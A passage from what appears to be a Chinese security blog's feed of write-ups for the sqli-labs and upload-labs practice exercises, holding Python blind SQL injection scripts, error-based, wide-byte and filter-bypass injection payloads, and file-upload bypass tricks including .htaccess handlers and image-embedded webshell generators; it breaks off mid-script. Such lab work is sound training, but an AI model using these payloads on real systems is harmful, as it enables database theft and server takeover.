range(<span class=\"hljs-number\">48</span>,<span class=\"hljs-number\">122</span>):<br>\t\t<span class=\"hljs-attr\">payload</span> = <span class=\"hljs-string\">&quot;admin&#x27;) and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.format(test,i,j)<br>\t\t<span class=\"hljs-attr\">post_r</span> = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>\t\t<span class=\"hljs-attr\">r</span> = requests.post(url,<span class=\"hljs-attr\">data=post_r)</span><br>\t\t<span class=\"hljs-attr\">l</span> = len(r.text)<br>\t\t<span class=\"hljs-attr\">txt</span> = r.text<br>\t\t<span class=\"hljs-attr\">s</span> = <span class=\"hljs-string\">&quot;../images/flag.jpg&quot;</span><br>\t\t<span class=\"hljs-keyword\">if</span> (s <span class=\"hljs-keyword\">in</span> txt):<br>\t\t\tresult+=chr(j)<br>\t\t\tprint(result)<br>\t\t\tbreak<br></code></pre></td></tr></table></figure>\n<p>以及一个网上找的一个较好的脚本‘<a href=\"https://blog.csdn.net/vhkjhwbs/article/details/98960802%E2%80%99%EF%BC%9A\">https://blog.csdn.net/vhkjhwbs/article/details/98960802’：</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br> <br>chars = <span class=\"hljs-string\">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&amp;%/^!~&quot;</span><br>result = <span class=\"hljs-string\">&quot;&quot;</span><br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_length</span>(<span class=\"hljs-params\">value</span>):</span>  <span class=\"hljs-comment\">#获取要查询的数据的长度</span><br>    <span class=\"hljs-keyword\">for</span> n <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">100</span>):<br>        payload = <span class=\"hljs-string\">&quot;admin&#x27;) and length((&#123;0&#125;)) =&#123;1&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,n)<br>        data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>        html = requests.post(url,data=data)<br>        length = <span class=\"hljs-built_in\">len</span>(html.text)<br>        <span class=\"hljs-keyword\">if</span> length &gt;value:<br>            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;……data length is :&quot;</span> + <span class=\"hljs-built_in\">str</span>(n))<br>            <span class=\"hljs-keyword\">return</span>  n<br> <br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get_data</span>(<span class=\"hljs-params\">data_length,value</span>):</span> <span class=\"hljs-comment\">#获取数据</span><br>    <span class=\"hljs-keyword\">global</span> result<br>    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,data_length):<br>        <span class=\"hljs-keyword\">for</span> char <span class=\"hljs-keyword\">in</span> chars:<br>            payload = <span class=\"hljs-string\">&quot;admin&#x27;)and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class=\"hljs-built_in\">format</span>(data_payload,i,<span class=\"hljs-built_in\">ord</span>(char))<br>            data = &#123;<span class=\"hljs-string\">&quot;uname&quot;</span>:payload,<span class=\"hljs-string\">&quot;passwd&quot;</span>:<span class=\"hljs-string\">&quot;admin&quot;</span>&#125;<br>            html = requests.post(url,data=data)<br>            length = <span class=\"hljs-built_in\">len</span>(html.text)<br>            <span class=\"hljs-keyword\">if</span> length&gt;value:         <span class=\"hljs-comment\">#根据返回长度的不同来判断字符正确与否</span><br>                result += char<br>                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;…… data is :&quot;</span>+ result)<br>                <span class=\"hljs-keyword\">break</span><br> <br> <br>url = <span class=\"hljs-string\">&quot;http://47.96.233.216:8080/Less-13/&quot;</span><br>data_payload = <span class=\"hljs-string\">&quot;select group_concat(table_name)from information_schema.tables where table_schema = database()&quot;</span><br>value = <span class=\"hljs-number\">1460</span> <br> <br>length = get_length(value) +<span class=\"hljs-number\">1</span><br>get_data(length,value)<br><span class=\"hljs-built_in\">print</span>(result)<br><br></code></pre></td></tr></table></figure>\n<h2 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h2><p>用<code>&quot;</code>闭合</p>\n<h2 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h2><p>同第十三关脚本</p>\n<h2 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h2><p>用<code>&quot;)</code>闭合</p>\n<h2 id=\"Less-17\"><a href=\"#Less-17\" class=\"headerlink\" title=\"Less-17\"></a>Less-17</h2><p>盲猜报错注入</p>\n<h3 id=\"数据类型溢出\"><a href=\"#数据类型溢出\" class=\"headerlink\" title=\"数据类型溢出\"></a>数据类型溢出</h3><p>select exp(~(select*from(select user())x));   # MySQL &lt; 5.5.53<br>pow, cot</p>\n<h3 id=\"几何函数报错\"><a href=\"#几何函数报错\" class=\"headerlink\" title=\"几何函数报错\"></a>几何函数报错</h3><p>select multipoint((select * from (select * from (select version())a)b)); # 低版本<br>geometrycollection multipoint polygon multipolygon linestring multilinestring等</p>\n<h3 id=\"Xpath语法错误\"><a href=\"#Xpath语法错误\" class=\"headerlink\" title=\"Xpath语法错误\"></a>Xpath语法错误</h3><p>select updatexml(1,concat(0x3a,(select @@version),0x3a),1) # MySQL &gt; 5.1<br>select extractvalue(1,concat(0x3a,(select @@version),0x3a))</p>\n<p>另外当concat被过滤时可以<br>updatexml(1,make_set(3,’’,(select version())),1)</p>\n<h3 id=\"报错注入的几种函数及其用法：\"><a href=\"#报错注入的几种函数及其用法：\" class=\"headerlink\" title=\"报错注入的几种函数及其用法：\"></a>报错注入的几种函数及其用法：</h3><ol>\n<li>floor():<code>select count(*) from infromation_schema.tables group by concat((select database()),floor(rand(0)*2));</code>group by 对rand()函数进行操作时产生错误</li>\n<li>extractvalue():<code>extractualue(1,concat(0x7e,(select database()),0x7e));</code>XPATH语法错误报错</li>\n<li>updatexml():<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>XPATH语法错误报错</li>\n<li>MYSQL5.7新增：<code>select gtid_subset((select @@version), 2);</code><br>在passwd处存在注入点：<br>payload：<code>11111&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),321)--+</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/9.png\" alt=\"sql\"><h2 id=\"Less-18\"><a href=\"#Less-18\" class=\"headerlink\" title=\"Less-18\"></a>Less-18</h2>可以猜测UA可能存在注入点<br>构造UA<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><h2 id=\"Less-19\"><a href=\"#Less-19\" class=\"headerlink\" title=\"Less-19\"></a>Less-19</h2>reffer存在注入点，其余同上<h2 id=\"Less-20\"><a href=\"#Less-20\" class=\"headerlink\" title=\"Less-20\"></a>Less-20</h2>打开提示cookie，那就先抓个包，构造cookie<code>uname=admin&#39;</code>发现报错，可知存在注入点，其余就是正常步骤，先判断列数，可以发现是3。。。。<h2 id=\"Less-21\"><a href=\"#Less-21\" class=\"headerlink\" title=\"Less-21\"></a>Less-21</h2>用<code>&#39;)</code>闭合，并且是要经过base64编码，其余同上<h2 id=\"Less-22\"><a href=\"#Less-22\" class=\"headerlink\" title=\"Less-22\"></a>Less-22</h2>用<code>&quot;</code>闭合<h2 id=\"Less-23\"><a href=\"#Less-23\" class=\"headerlink\" title=\"Less-23\"></a>Less-23</h2><code>#</code>以及<code>--</code>被过滤<br>那就用<code>or &#39;1&#39;=&#39;1</code>来闭合多余出来的单引号<h2 id=\"Less-24\"><a href=\"#Less-24\" class=\"headerlink\" title=\"Less-24\"></a>Less-24</h2>二次注入<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/10.png\" alt=\"sql\"><br>先注册一个用户名为<code>admin&#39; #</code>的账号，虽然注册时会被转义，但是数据还是会被存入数据库，所以在接下来其他地方被调用时就会出现漏洞，即在改密码时，SQL语句拼接出<code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39; #&#39; and password=&#39;$curr_pass&#39; &quot;</code>，就可以修改admin的密码，实现SQL注入<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/11.png\" alt=\"sql\"><br>就可以用admin账户登录<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/12.png\" alt=\"sql\"></li>\n</ol>\n<h2 id=\"Less-25\"><a href=\"#Less-25\" class=\"headerlink\" title=\"Less-25\"></a>Less-25</h2><p>AND和OR都被过滤，但是UNION没有被过滤可以实现注入，并且可以通过双写来Bypass过滤：<code>id=-1&#39; oorr 1=1--+</code></p>\n<h2 id=\"Less-25a\"><a href=\"#Less-25a\" class=\"headerlink\" title=\"Less-25a\"></a>Less-25a</h2><p>和25一样</p>\n<h2 id=\"Less-26\"><a href=\"#Less-26\" class=\"headerlink\" title=\"Less-26\"></a>Less-26</h2><p>过滤了空格，本想着用<code>/**/</code>绕过，发现还是不行，一看源码：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/13.png\" alt=\"sql\"><br>过滤了大部分的东西，本来想着绕过空格的方式：<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格，发现其中%a0以及%0b可用，<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/14.png\" alt=\"sql\"><br>或者需要用()绕过，使用报错注入的方式，构造payload：<code>?id=-1%27||extractualue(1,concat(0x7e,(select%20database()),0x7e))||%271%27=%271</code><br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/15.png\" alt=\"sql\"><br><code>0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code>爆表名<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/16.png\" alt=\"sql\"></p>\n<h2 id=\"Less-26a\"><a href=\"#Less-26a\" class=\"headerlink\" title=\"Less-26a\"></a>Less-26a</h2><p>基于绕过过滤空格后的正确注入（可用%a0绕过），或者基于bool盲注，因为没有错误回显，所以不能报错注入</p>\n<h2 id=\"Less-27\"><a href=\"#Less-27\" class=\"headerlink\" title=\"Less-27\"></a>Less-27</h2><p>题目说过滤了UNION和SELECT，但是查看源代码发现可以大小写绕过。。。同时过滤了空格和注释夫，可以用上面的方法绕过，payload“<code>?id=0&#39;%a0unIon%a0seleCt%a01,2,3||&#39;1&#39;=&#39;1</code></p>\n<h2 id=\"Less-27a\"><a href=\"#Less-27a\" class=\"headerlink\" title=\"Less-27a\"></a>Less-27a</h2><p>用<code>&quot;</code>闭合，其余同上</p>\n<h2 id=\"Less-28\"><a href=\"#Less-28\" class=\"headerlink\" title=\"Less-28\"></a>Less-28</h2><p>虽然题目说过滤了union和select，但是发现仍然是可以用的，不知道是环境问题还是题目本来就是这样的，同时是用<code>(&#39;</code>闭合的，且过滤了空格等，课用上面的方法绕过<br>payload：<code>?id=0&#39;)%a0union%a0select%a01,2,3||(&#39;1&#39;=&#39;1</code><br>后来才发现题目是过滤了<code>union select</code>这个词组，因为中间加了<code>%a0</code>,刚好绕过了检测</p>\n<h2 id=\"Less-28a\"><a href=\"#Less-28a\" class=\"headerlink\" title=\"Less-28a\"></a>Less-28a</h2><p>同上，但是貌似减少课过滤的东西，更简单了？？</p>\n<h2 id=\"Less-29\"><a href=\"#Less-29\" class=\"headerlink\" title=\"Less-29\"></a>Less-29</h2><p>尝试一下<code>?id=0%27union%20select%201,2,3--+</code>,发现好像啥也没过滤？？？<br>然后就和第一关一样了。。。</p>\n<h2 id=\"Less-30\"><a href=\"#Less-30\" class=\"headerlink\" title=\"Less-30\"></a>Less-30</h2><p>先用单引号闭合发现没用，再用双引号闭合发现报错，接下来就和上面的一样了</p>\n<h2 id=\"Less-31\"><a href=\"#Less-31\" class=\"headerlink\" title=\"Less-31\"></a>Less-31</h2><p>用<code>&quot;)</code>闭合，其余一样</p>\n<h2 id=\"Less-32\"><a href=\"#Less-32\" class=\"headerlink\" title=\"Less-32\"></a>Less-32</h2><p>宽字节注入，payload：<code>?id=0%df%27%20union%20select%201,2,3--+</code></p>\n<h2 id=\"Less-33\"><a href=\"#Less-33\" class=\"headerlink\" title=\"Less-33\"></a>Less-33</h2><p>同上</p>\n<h2 id=\"Less-34\"><a href=\"#Less-34\" class=\"headerlink\" title=\"Less-34\"></a>Less-34</h2><p>这里的提交方式是post，但是又用/转义了’，一种方式是将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ ，但是这%df仍然可以用<br>，再加上报错注入：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/17.png\" alt=\"sql\"></p>\n<h2 id=\"Less-35\"><a href=\"#Less-35\" class=\"headerlink\" title=\"Less-35\"></a>Less-35</h2><p>直接注。。。</p>\n<h2 id=\"Less-36\"><a href=\"#Less-36\" class=\"headerlink\" title=\"Less-36\"></a>Less-36</h2><p>%df宽字节注入</p>\n<h2 id=\"Less-37\"><a href=\"#Less-37\" class=\"headerlink\" title=\"Less-37\"></a>Less-37</h2><p>这一次就没有像34关一样简单，%df没有办法用了，但是可以将utf-8转换为utf-16或 utf-32，构造payload“<code>111�&#39; union select 1,(select database())--+</code></p>\n<p><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/18.png\" alt=\"sql\"></p>\n<h2 id=\"Less-38\"><a href=\"#Less-38\" class=\"headerlink\" title=\"Less-38\"></a>Less-38</h2><p>直接注。。。</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "url": "http://blog.m1n.me/2019/10/12/upload-labs/",
            "title": "upload-labs",
            "date_published": "2019-10-12T02:48:24.000Z",
            "content_html": "<p>emmmm</p>\n<span id=\"more\"></span>\n<h1 id=\"Less-1\"><a href=\"#Less-1\" class=\"headerlink\" title=\"Less-1\"></a>Less-1</h1><ol>\n<li>前端验证，先将一句话改成jpg，通过前端验证后抓包修改后缀名为php以及修改content-type：application/octet-stream成功上传</li>\n<li>禁用JS直接上传</li>\n</ol>\n<h1 id=\"Less-2\"><a href=\"#Less-2\" class=\"headerlink\" title=\"Less-2\"></a>Less-2</h1><p>这一关检测的是Content-Type: image/jpeg，抓包修改一下就ok</p>\n<h1 id=\"Less-3\"><a href=\"#Less-3\" class=\"headerlink\" title=\"Less-3\"></a>Less-3</h1><p>黑名单绕过，可以上传.phtml等文件绕过，php解释器可以将phpt、php3、4、5、phtml解析成PHP文件，不能解析的后缀会以txt形式展现，但是其中包含的html代码会被浏览器解析，可以执行JS代码</p>\n<h1 id=\"Less-4\"><a href=\"#Less-4\" class=\"headerlink\" title=\"Less-4\"></a>Less-4</h1><p>先上传一个test.phpx文件，再上传.htaccess文件使得它能够被解析来绕过.htaccess内容：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-section\">&lt;FilesMatch <span class=\"hljs-string\">&quot;test.phpx&quot;</span>&gt;</span><br><br>  <span class=\"hljs-attribute\"><span class=\"hljs-nomarkup\">SetHandler</span></span> application/x-httpd-php<br><br><span class=\"hljs-section\">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>\n<p>或者：</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">AddType <span class=\"hljs-built_in\">application</span>/x-httpd-php .jpg<br></code></pre></td></tr></table></figure>\n<p>来使得jpg能被解析</p>\n<h1 id=\"Less-5\"><a href=\"#Less-5\" class=\"headerlink\" title=\"Less-5\"></a>Less-5</h1><p>大小写绕过。。。。</p>\n<h1 id=\"Less-6\"><a href=\"#Less-6\" class=\"headerlink\" title=\"Less-6\"></a>Less-6</h1><p>文件名结尾加空格绕过黑名单</p>\n<h1 id=\"Less-7\"><a href=\"#Less-7\" class=\"headerlink\" title=\"Less-7\"></a>Less-7</h1><p>文件结尾加“.”可以被解析</p>\n<h1 id=\"Less-8\"><a href=\"#Less-8\" class=\"headerlink\" title=\"Less-8\"></a>Less-8</h1><p>文件结尾加“::$DATA”,Windows特性</p>\n<h1 id=\"Less-9\"><a href=\"#Less-9\" class=\"headerlink\" title=\"Less-9\"></a>Less-9</h1><p>文件结尾加“.空格.”，最后会变成”.php.”Windows特性</p>\n<h1 id=\"Less-10\"><a href=\"#Less-10\" class=\"headerlink\" title=\"Less-10\"></a>Less-10</h1><p>上传phtmlhp绕过</p>\n<h1 id=\"Less-11\"><a href=\"#Less-11\" class=\"headerlink\" title=\"Less-11\"></a>Less-11</h1><p>上传路径修改成../upload/1.php%00,%00截断。或者尝试1.php/. </p>\n<h1 id=\"Less-12\"><a href=\"#Less-12\" class=\"headerlink\" title=\"Less-12\"></a>Less-12</h1><p>上传路径修改成../upload/1.php+，然后用16进制查看，找到68  70   2b，把2b修改成00然后上传</p>\n<h1 id=\"Less-13\"><a href=\"#Less-13\" class=\"headerlink\" title=\"Less-13\"></a>Less-13</h1><p>要求上传三种格式的图片马，然后用文件包含漏洞执行。jpg格式可以直接用CMD命令<code>copy test.jpg/b test.php/a ma.jpg</code>生成，GIF和PNG格式可以通过Hxd修改正常图片生成，</p>\n<p>其中JPG格式头部<code>FF D8 (FF E0)</code>尾部<code>FF D9</code>PNG格式头部<code>89 50 4E 47 0D 0A 1A 0A</code>GIF格式头部<code>47 49 46 38 39 61</code></p>\n<h1 id=\"Less-14\"><a href=\"#Less-14\" class=\"headerlink\" title=\"Less-14\"></a>Less-14</h1><p>提示用getimagesize()获取图片信息，同样上传图片马即可绕过</p>\n<h1 id=\"Less-15\"><a href=\"#Less-15\" class=\"headerlink\" title=\"Less-15\"></a>Less-15</h1><p>提示本pass使用exif_imagetype()检查是否为图片文件！，绕过方法同上</p>\n<h1 id=\"Less-16\"><a href=\"#Less-16\" class=\"headerlink\" title=\"Less-16\"></a>Less-16</h1><p>提示进行了二次渲染，印象中是某一个区块二次渲染时不会被改变，GIF格式加在尾部的代码会被删除，我找到了中间空白部分，加上phpinfo后就可以执行。</p>\n<p>PNG还有JPG格式的处理方法比较麻烦，用网上的脚本来生成</p>\n<p>PNG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$p</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>, <span class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xf7</span>, <span class=\"hljs-number\">0x0e</span>, <span class=\"hljs-number\">0x93</span>, <span class=\"hljs-number\">0x1b</span>, <span class=\"hljs-number\">0x23</span>,<br>           <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x2c</span>, <span class=\"hljs-number\">0x8a</span>, <span class=\"hljs-number\">0xd0</span>, <span class=\"hljs-number\">0x80</span>, <span class=\"hljs-number\">0xf9</span>, <span class=\"hljs-number\">0xe1</span>, <span class=\"hljs-number\">0xae</span>,<br>           <span class=\"hljs-number\">0x22</span>, <span class=\"hljs-number\">0xf6</span>, <span class=\"hljs-number\">0xd9</span>, <span class=\"hljs-number\">0x43</span>, <span class=\"hljs-number\">0x5d</span>, <span class=\"hljs-number\">0xfb</span>, <span class=\"hljs-number\">0xae</span>, <span class=\"hljs-number\">0xcc</span>,<br>           <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x01</span>, <span class=\"hljs-number\">0xdc</span>, <span class=\"hljs-number\">0xa3</span>, <span class=\"hljs-number\">0x9f</span>,<br>           <span class=\"hljs-number\">0x67</span>, <span class=\"hljs-number\">0xa5</span>, <span class=\"hljs-number\">0xbe</span>, <span class=\"hljs-number\">0x5f</span>, <span class=\"hljs-number\">0x76</span>, <span class=\"hljs-number\">0x74</span>, <span class=\"hljs-number\">0x5a</span>, <span class=\"hljs-number\">0x4c</span>,<br>           <span class=\"hljs-number\">0xa1</span>, <span class=\"hljs-number\">0x3f</span>, <span class=\"hljs-number\">0x7a</span>, <span class=\"hljs-number\">0xbf</span>, <span class=\"hljs-number\">0x30</span>, <span class=\"hljs-number\">0x6b</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0x2d</span>,<br>           <span class=\"hljs-number\">0x60</span>, <span class=\"hljs-number\">0x65</span>, <span class=\"hljs-number\">0x7d</span>, <span class=\"hljs-number\">0x52</span>, <span class=\"hljs-number\">0x9d</span>, <span class=\"hljs-number\">0xad</span>, <span class=\"hljs-number\">0x88</span>, <span class=\"hljs-number\">0xa1</span>,<br>           <span class=\"hljs-number\">0x66</span>, <span class=\"hljs-number\">0x44</span>, <span class=\"hljs-number\">0x50</span>, <span class=\"hljs-number\">0x33</span>);<br><br><br><br><span class=\"hljs-variable\">$img</span> = imagecreatetruecolor(<span class=\"hljs-number\">32</span>, <span class=\"hljs-number\">32</span>);<br><br><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-variable\">$y</span> = <span class=\"hljs-number\">0</span>; <span class=\"hljs-variable\">$y</span> &lt; sizeof(<span class=\"hljs-variable\">$p</span>); <span class=\"hljs-variable\">$y</span> += <span class=\"hljs-number\">3</span>) &#123;<br>   <span class=\"hljs-variable\">$r</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>];<br>   <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">1</span>];<br>   <span class=\"hljs-variable\">$b</span> = <span class=\"hljs-variable\">$p</span>[<span class=\"hljs-variable\">$y</span>+<span class=\"hljs-number\">2</span>];<br>   <span class=\"hljs-variable\">$color</span> = imagecolorallocate(<span class=\"hljs-variable\">$img</span>, <span class=\"hljs-variable\">$r</span>, <span class=\"hljs-variable\">$g</span>, <span class=\"hljs-variable\">$b</span>);<br>   imagesetpixel(<span class=\"hljs-variable\">$img</span>, round(<span class=\"hljs-variable\">$y</span> / <span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>, <span class=\"hljs-variable\">$color</span>);<br>&#125;<br><br>imagepng(<span class=\"hljs-variable\">$img</span>,<span class=\"hljs-string\">&#x27;./1.png&#x27;</span>);<br><span class=\"hljs-meta\">?&gt;</span><br>​```<br></code></pre></td></tr></table></figure>\n\n<p>JPG:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span 